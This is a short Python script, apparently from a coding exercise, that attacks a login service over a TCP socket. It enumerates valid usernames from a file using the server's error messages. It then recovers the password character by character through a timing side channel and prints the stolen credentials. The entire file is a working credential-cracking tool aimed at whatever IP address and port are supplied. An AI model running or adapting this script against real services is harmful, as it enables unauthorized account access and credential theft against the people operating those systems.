import argparse
import socket
import sys
import string
import json
from time import perf_counter

parser = argparse.ArgumentParser(description='Give IP address, port and password to hack')
parser.add_argument('IP_ADDRESS', type=str, help='IP address to connect')
parser.add_argument('PORT', type=int, help='Port to connect')
parser.add_argument('--message', type=str, help='message to send to the address')


def get_logins():
    with open('logins.txt', encoding='utf-8') as file:
        logins = (line for line in file.read().splitlines())
    return logins


def hack(login, hack_socket):
    attempt = {
        "login": login,
        "password": ' '
    }
    hack_socket.send(json.dumps(attempt).encode())
    response = hack_socket.recv(1024)
    msg = json.loads(response.decode())
    if msg['result'] == 'Wrong password!':
        creds = generate_password(hack_socket, attempt)
        return creds
    return False


def generate_password(hack_socket, attempt):
    chars = string.ascii_letters + string.digits
    success, i, prev_val = False, 0, ''
    while not success:
        attempt['password'] = prev_val + chars[i]
        start = perf_counter()
        hack_socket.send(json.dumps(attempt).encode())
        response = hack_socket.recv(1024)
        msg = json.loads(response.decode())
        end = perf_counter()
        exec_time = end - start

        if msg['result'] == 'Connection success!':
            success = True
        elif exec_time > 0.1:
            prev_val += chars[i]
            i = 0
        else:
            attempt['password'] = prev_val
            i += 1
    return attempt


def main():
    with socket.socket() as hack_socket:
        args = parser.parse_args()
        address = (args.IP_ADDRESS, args.PORT)
        hack_socket.connect(address)
        logins = get_logins()
        for login in logins:
            success = hack(login, hack_socket)
            if success:
                print(json.dumps(success))
                sys.exit(0)


if __name__ == '__main__':
    main()
